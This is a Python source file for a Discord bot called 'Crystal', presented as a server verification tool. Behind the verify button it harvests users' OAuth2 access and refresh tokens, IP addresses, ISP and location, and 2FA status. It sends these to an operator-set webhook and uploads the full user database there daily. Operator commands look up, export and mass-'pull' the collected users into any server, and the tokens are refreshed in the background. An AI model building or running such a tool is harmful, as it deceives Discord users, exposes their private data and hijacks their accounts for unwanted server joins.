import asyncio
import aiohttp
from quart import Quart, request, redirect, abort, send_file
from flag import flag
import discord
from discord import app_commands

import ujson as json
import threading
from collections import Counter

app = Quart(__name__)

class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.all())
        self.tree = app_commands.CommandTree(self)
        self.tree.remove_command('help')

    async def setup_hook(self):
       await self.tree.sync()
    
bot = Client()

lock = asyncio.Lock()

with open('config.json', 'r') as f:
    json_data = json.loads(f.read())
    whitelist = json_data['whitelist']
    bot_token = json_data['bot_token']
    client_secret = json_data['client_secret']
    client_id = json_data['client_id']
    redirect_uri = json_data['redirect_uri']
    logger_webhook_url = json_data['logger_webhook_url']
    post_auth_redirect = json_data['post_auth_redirect']
    verification = json_data['verification']

async def update_settings(setting, value):
    with open('config.json', 'r+') as f:
        json_data = json.loads(f.read())
        json_data[setting] = value
        f.seek(0)
        f.write(json.dumps(json_data, indent=2))
        f.truncate()

    with open('config.json', 'r') as f:
        json_data = json.loads(f.read())
        global whitelist; whitelist = json_data['whitelist']
        global bot_token; bot_token = json_data['bot_token']
        global client_secret; client_secret = json_data['client_secret']
        global client_id; client_id = json_data['client_id']
        global redirect_uri; redirect_uri = json_data['redirect_uri']
        global logger_webhook_url; logger_webhook_url = json_data['logger_webhook_url']
        global post_auth_redirect; post_auth_redirect = json_data['post_auth_redirect']
        global verification; verification = json_data['verification']

async def update_user(user_id, user_data):
    async with lock:
        with open('users.json', 'r+', encoding='utf-8') as f:
            try:
                data = json.loads(f.read())
            except json.JSONDecodeError:
                data = {}
            data[user_id] = user_data
            f.seek(0)
            f.write(json.dumps(data, indent=2))
            f.truncate()

async def decode_oauth2(code):
    async with aiohttp.ClientSession() as session:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        data = {
            'client_id': client_id,
            'client_secret': client_secret,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirect_uri,
            'scope': 'identify guilds.join'
        }
        
        response = await session.post('https://discord.com/api/oauth2/token', headers=headers, data=data)
        json_response = await response.json()
        print(json_response)
        return json_response['access_token'], json_response['refresh_token']

async def get_user(access_token):
    async with aiohttp.ClientSession() as session:
        headers = {
            'Authorization': f'Bearer {access_token}'
        }

        user_info = await session.get('https://discord.com/api/users/@me', headers=headers)
        return await user_info.json()

async def refresh_token(refresh_token):
    async with aiohttp.ClientSession() as session:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        data = {
            'client_id': client_id,
            'client_secret': client_secret,
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token
        }

        response = await session.post('https://discord.com/api/oauth2/token', headers=headers, data=data)
        json_response = await response.json()
        print(json_response)
        return json_response['access_token'], json_response['refresh_token']

async def add_user_to_guild(user_id, server_id):
    with open('users.json', 'r', encoding='utf-8') as f:
        json_data = json.loads(f.read())
        access_token = json_data[user_id]['oauth2']['access_token']

    async with aiohttp.ClientSession() as session:
        headers = {
            "Authorization": f"Bot {bot_token}",
            "Content-Type": "application/json"
        }

        data = {
            "access_token": access_token
        }

        response = await session.put(f'https://discord.com/api/guilds/{server_id}/members/{user_id}', headers=headers, json=data)
        print(await response.json())
        return response
    

@app.route('/c')
async def callback():
    code = request.args.get('code')
    if len(code) != 30:
        return ''
    
    access_token, refresh_token = await decode_oauth2(code)

    user_info = await get_user(access_token)
    if request.remote_addr == '127.0.0.1':
        request.remote_addr = '1.1.1.1'
    forwarded_for = request.headers.get('X-Forwarded-For', request.remote_addr)
    request.remote_addr = forwarded_for
    async with aiohttp.ClientSession() as session:
        response = await session.get(f'http://ip-api.com/json/{request.remote_addr}')
        json_data = await response.json()
        country_code = json_data.get('countryCode', '')
        isp = json_data.get('isp', '')
        org = json_data.get('org', '')

    if user_info.get('premium_type', '') == 0:
        nitro_type = 'No Nitro'
    elif user_info.get('premium_type', '') == 1:
        nitro_type = 'Nitro Basic'
    else:
        nitro_type = 'Nitro Boost'

    await update_user(user_info['id'], {
        'ip': {
            'address':           request.remote_addr,
            'country_code':      country_code,
            'flag':              flag(country_code),
            'isp':               isp,
            'org':               org
        },
        'username':              user_info.get('username', ''),
        'display_name':          user_info.get('global_name', ''),
        'nitro_type':            nitro_type,
        'language':              user_info.get('locale', ''),
        '2fa_enabled':           user_info.get('mfa_enabled', ''),
        'avatar_url':            f'https://cdn.discordapp.com/avatars/{user_info["id"]}/{user_info.get("avatar", "")}.webp?size=480',
        'oauth2': {
            'access_token': access_token,
            'refresh_token': refresh_token
        }
    })

    if logger_webhook_url:
        embed = {
            "title": "Crystal - New User Authenticated",
            "color": 0x2B2D31,
            "fields": [
                {"name": "👤 User", "value": f"`{user_info['id']}`", "inline": True},
                {"name": "🔍 Location", "value": f"🌐 IP Address: `{request.remote_addr}`\n🌍 Country: `{country_code}`\n📡 ISP: `{isp}`\n🏢 Organization: `{org}`"},
                {"name": "🎁 Nitro Type", "value": f"`{nitro_type}`", "inline": True},
                {"name": "🔤 Language", "value": f"`{user_info.get('locale', '')}`", "inline": True},
                {"name": "🔒 2FA Enabled", "value": f"`{str(user_info.get('mfa_enabled', ''))}`", "inline": True}
            ],
            "thumbnail": {"url": f'https://cdn.discordapp.com/avatars/{user_info["id"]}/{user_info.get("avatar", "")}.webp?size=480'}
        }

        async with aiohttp.ClientSession() as session:
            await session.post(logger_webhook_url, json={"content": f"<@{user_info['id']}> {user_info['username']}", "embeds": [embed]})

    if not post_auth_redirect:
        return await send_file('index.html')
    
    if verification['guild_id'] and verification['verified_role_id']:
        async with aiohttp.ClientSession() as session:
            response = await session.put(f'https://discord.com/api/guilds/{verification['guild_id']}/members/{user_info['id']}/roles/{verification['verified_role_id']}', headers={"Authorization": f"Bot {bot_token}"})

    return redirect(post_auth_redirect)

@bot.tree.command(description='💎 View the user count & locales')
async def count(interaction: discord.Interaction):
    if interaction.user.id not in whitelist:
        return
    
    await interaction.response.defer()

    with open('users.json', 'r') as f:
        user_data = json.loads(f.read())
        total_users = len(user_data)
        locales = Counter(user['ip']['country_code'] for user in user_data.values())

    sorted_locales = locales.most_common(9)

    embed = discord.Embed(title="Crystal Authbot - Auth Count", color=0x2B2D31)
    embed.add_field(name="`🌐`", value=f'`{str(total_users)}`', inline=False)

    for country_code, count in sorted_locales:
        embed.add_field(name=f'{flag(country_code)}', value=f'`{str(count)}`', inline=False)

    await interaction.followup.send(embed=embed)

@bot.tree.command(description='💎 Lookup a user\'s information')
async def lookup(interaction: discord.Interaction, user:str):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)

    with open('users.json', 'rb') as file:
        data = json.loads(file.read())
        user_info = data.get(user, None)
        if user_info:
            account = await bot.fetch_user(int(user))
            embed = discord.Embed(
                title="Crystal - User Lookup",
                color=0x2B2D31
            )

            embed.add_field(name="👤 User", value=f"`{user}`", inline=True)
            embed.add_field(
                name="🔍 Location", 
                value=f"🌐 IP Address: `{user_info['ip']['address']}`\n"
                    f"🌍 Country: `{user_info['ip']['country_code']}`\n"
                    f"📡 ISP: `{user_info['ip']['isp']}`\n"
                    f"🏢 Organization: `{user_info['ip']['org']}`", 
                inline=False
            )
            embed.add_field(name="🎁 Nitro Type", value=f"`{user_info.get('nitro_type', '')}`", inline=True)
            embed.add_field(name="🔤 Language", value=f"`{user_info.get('language', '')}`", inline=True)
            embed.add_field(name="🔒 2FA Enabled", value=f"`{user_info.get('2fa_enabled', '')}`", inline=True)

            embed.set_thumbnail(url=user_info.get("avatar_url", ""))

            await interaction.followup.send(f"<@{user}> {account.name}", embed=embed) 
        else:
            await interaction.followup.send(f'`❌` Invalid user {user}')

@bot.tree.command(description='💎 Export users')
async def export(interaction: discord.Interaction):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)

    with open('users.json', 'rb') as file:
        await interaction.followup.send(file=discord.File(file, 'users.json'))

pulling = False

@bot.tree.command(description='💎 Stop pulling')
async def stop(interaction: discord.Interaction):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)
    
    global pulling
    pulling = False

    await interaction.followup.send(f'`✅` Stopped pulling')

@bot.tree.command(description='💎 Pull users')
async def pull(interaction: discord.Interaction, count: str, server_id: str=None):
    if interaction.user.id not in whitelist:
        return
    
    if not server_id:
        server_id = interaction.guild.id

    guild = await bot.fetch_guild(int(server_id))
    guild_icon_url = None
    if guild.icon:
        guild_icon_url = guild.icon.url
    

    await interaction.response.defer()

    global pulling
    pulling = True

    if not count.isdigit():
        with open('users.json', 'r') as f:
            count = len(json.loads(f.read()))
    else:
        count = int(count)

    success = 0
    ratelimit = 0
    deauth = 0
    fail = 0
    total = 0
    already_in = 0

    async def create_embed(count, success, fail, already_in, ratelimit, deauth):
        embed = discord.Embed(title=f"Pulling to {guild.id}...", color=0x2B2D31)
        embed.add_field(name="`🎯` Desired", value=f'`{count}`', inline=True)
        embed.add_field(name="`✅` Pulled", value=f'`{success}`', inline=True)
        embed.add_field(name="`🥊` Ratelimited", value=f'`{ratelimit}`', inline=True)
        embed.add_field(name="`🔓` Deauthorised", value=f'`{deauth}`', inline=True)
        embed.add_field(name="`❌` Unknown Error", value=f'`{fail}`', inline=True)
        embed.add_field(name="`⏰` Already In", value=f'`{already_in}`', inline=True)
        embed.set_footer(text=f'Crystal - {guild.name}')
        embed.set_thumbnail(url=guild_icon_url)
        return embed

    message = await interaction.followup.send(embed=await create_embed(count, success, fail, already_in, ratelimit, deauth))

    async def update_embed():
        embed = await create_embed(count, success, fail, already_in, ratelimit, deauth)
        await interaction.followup.edit_message(message.id, embed=embed)

    with open('users.json', 'r') as f:
        json_data = json.loads(f.read())
        guild_members = [str(member.id) for member in await interaction.guild.chunk()]
        
        for user_id, user_info in json_data.items():
            if not pulling:
                break

            if user_id in guild_members:
                already_in += 1
                await update_embed()
                continue  
            
            if total >= count:
                break  
            
            response = await add_user_to_guild(user_id, server_id)
            
            response = await response.json()
            if response.get('message', None):
                if 'limit' in str(response).lower():
                    ratelimit += 1
                elif 'oauth2' in str(response).lower():
                    deauth += 1
                else:
                    fail += 1
            else:
                success += 1
            total += 1
            await update_embed()

            await asyncio.sleep(1)

    embed = discord.Embed(title=f"Pulling to {guild.id} Finished", color=0x2B2D31)
    embed.add_field(name="`🎯` Desired", value=f'`{count}`', inline=True)
    embed.add_field(name="`✅` Pulled", value=f'`{success}`', inline=True)
    embed.add_field(name="`🥊` Ratelimited", value=f'`{ratelimit}`', inline=True)
    embed.add_field(name="`🔓` Deauthorised", value=f'`{deauth}`', inline=True)
    embed.add_field(name="`❌` Unknown Error", value=f'`{fail}`', inline=True)
    embed.add_field(name="`⏰` Already In", value=f'`{already_in}`', inline=True)
    embed.set_footer(text=f'Crystal - {guild.name}')
    embed.set_thumbnail(url=guild_icon_url)
    await interaction.followup.edit_message(message.id, embed=embed)

@bot.tree.command(description='💎 Create a verification embed with an OAuth2 verify button')
async def verify(interaction: discord.Interaction, button_label: str, title: str, description: str, hex_color: str, image_url: str = None, webhook_mode: bool = False, webhook_name: str = None, webhook_avatar_url: str = None):
    if interaction.user.id not in whitelist:
        return

    await interaction.response.defer(ephemeral=True)
    
    color = int(hex_color.replace('0x', '').replace('#', ''), 16)
    embed = discord.Embed(title=title, description=description, color=color)
    if image_url:
        embed.set_image(url=image_url)

    view = discord.ui.View()
    button = discord.ui.Button(style=discord.ButtonStyle.url, label=button_label, url=f"https://discord.com/oauth2/authorize?client_id={client_id}&response_type=code&redirect_uri={redirect_uri}&scope=identify+guilds.join")
    view.add_item(button)

    if webhook_mode:
        webhook = await interaction.channel.create_webhook(name=webhook_name or "Verification", avatar=await (await aiohttp.ClientSession().get(webhook_avatar_url)).read() if webhook_avatar_url else None)
        await webhook.send(embed=embed, view=view)
        await webhook.delete() 
    else:
        await interaction.channel.send(embed=embed, view=view)

@bot.tree.command(description='💎 Send a message')
async def send_message(interaction: discord.Interaction, content: str, webhook_name: str, webhook_avatar_url: str):
    if interaction.user.id not in whitelist:
        return

    await interaction.response.defer(ephemeral=True)

    webhook = await interaction.channel.create_webhook(name=webhook_name or "Verification", avatar=await (await aiohttp.ClientSession().get(webhook_avatar_url)).read() if webhook_avatar_url else None)
    await webhook.send(content)
    await webhook.delete() 

@bot.tree.command(description='💎 Set the verified role users receive post authentication')
async def set_verification(interaction: discord.Interaction, role:discord.Role):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)
    
    await update_settings("verification", {"guild_id": interaction.guild.id, "verified_role_id": role.id})
    await interaction.followup.send(f'`✅` Set verified role to {role}')

@bot.tree.command(description='💎 Reset the configuration')
async def reset_settings(interaction: discord.Interaction):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)
    
    await update_settings("logger_webhook_url", None)
    await update_settings("post_auth_redirect", None)
    await update_settings("verification", {"guild_id": None, "verified_role_id": None})
    await interaction.followup.send(f'`✅` Reset settings')

@bot.tree.command(description='💎 Set the URL for the webhook logs')
async def set_logs(interaction: discord.Interaction, webhook_url:str):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)

    try:
        async with aiohttp.ClientSession() as session:
            response = await session.get(webhook_url)
            response_json = await response.json()
            if response_json.get('channel_id'):
                await update_settings("logger_webhook_url", webhook_url)
                await interaction.followup.send(f'`✅` Set webhook logs URL to {webhook_url}')
            else:
                raise KeyError
    except:
        await interaction.followup.send(f'`❌` Invalid webhook URL {webhook_url}')

@bot.tree.command(description='💎 Set the URL users get redirected to after authentication')
async def set_redirect(interaction: discord.Interaction, redirect_url:str):
    if interaction.user.id not in whitelist:
        return    

    await interaction.response.defer(ephemeral=True)
    await update_settings("post_auth_redirect", redirect_url)
    await interaction.followup.send(f'`✅` Set post authentication redirect URL to {redirect_url}')

async def refresh_tokens_periodically():
    while True:
        with open('users.json', 'r') as f:
            data = json.loads(f.read())

        for user_id, user_info in data.items():
            refresh_token_value = user_info['oauth2']['refresh_token']
            try:
                new_access_token, new_refresh_token = await refresh_token(refresh_token_value)
                user_info['oauth2']['access_token'] = new_access_token
                user_info['oauth2']['refresh_token'] = new_refresh_token
                await update_user(user_id, user_info)

            except Exception as e:
                print(f"Failed to refresh token for user {user_id}: {e}")

        if logger_webhook_url:
            async with aiohttp.ClientSession() as session:
                with open('users.json', 'rb') as f:
                    form_data = aiohttp.FormData()
                    form_data.add_field('file', f, filename='users.json'.split('/')[-1])
                    form_data.add_field('content', 'DB Backup')
                    
                    await session.post(logger_webhook_url, data=form_data)

        await asyncio.sleep(86400)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    await bot.change_presence(activity=discord.CustomActivity(name='💎 Securing Discord Servers'), status=discord.Status.dnd)
    bot.loop.create_task(refresh_tokens_periodically())

def start_bot():
    bot.run(bot_token)

threading.Thread(target=start_bot).start()

app.run(host='0.0.0.0', port=80)